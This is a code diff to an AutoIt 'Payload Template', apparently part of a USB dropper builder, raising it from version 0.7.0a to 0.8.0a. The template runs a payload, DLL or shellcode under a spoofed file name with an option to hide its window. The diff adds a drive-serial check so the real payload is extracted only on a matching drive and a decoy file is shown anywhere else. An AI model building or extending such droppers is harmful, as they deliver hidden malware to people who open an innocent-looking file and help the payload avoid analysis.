@@ -1,4 +1,4 @@
-;Payload Template Version: 0.7.0a
+;Payload Template Version: 0.8.0a
 
 ;String Format Placeholder values
 ; 0  - #RequireAdmin pre-processor
@@ -10,7 +10,9 @@
 ; 6  - Spoofed File name (string)
 ; 7  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
 ; 8  - Console command execution switch (String | /k or /c)
-; 9 - Type of payload (integer | 0 = payload / 1 = dll payload / 2 = shell code)
+; 9  - Type of payload (integer | 0 = payload / 1 = dll payload / 2 = shell code)
+; 10 - Driver Serial Check (bool)
+; 11 - Driver Serial to Check (String)
 
 #NoTrayIcon
 {0}
@@ -24,6 +26,8 @@ Global $nmspoof = "{6}"
 Global $showwin = {7}
 Global $conswitch = "{8}"
 Global $payloadtype = {9}
+Global $dscheck = {10}
+Global $driveserial = "{11}"
 Global $drive = StringLeft(@ScriptDir, 3)
 Global $spoofarguments = "", $payloadtarget, $spooftarget
 
@@ -35,7 +39,7 @@ If $Cmdline[0] > 0 Then
     next
 EndIf
 
-If $drive = "C:\" Then
+If $drive = "C:\" or ($dscheck = true and (($driveserial = DriveGetSerial ($drive)) = False)) Then
     extractSpoof(true)
 Else
     extractPayload()
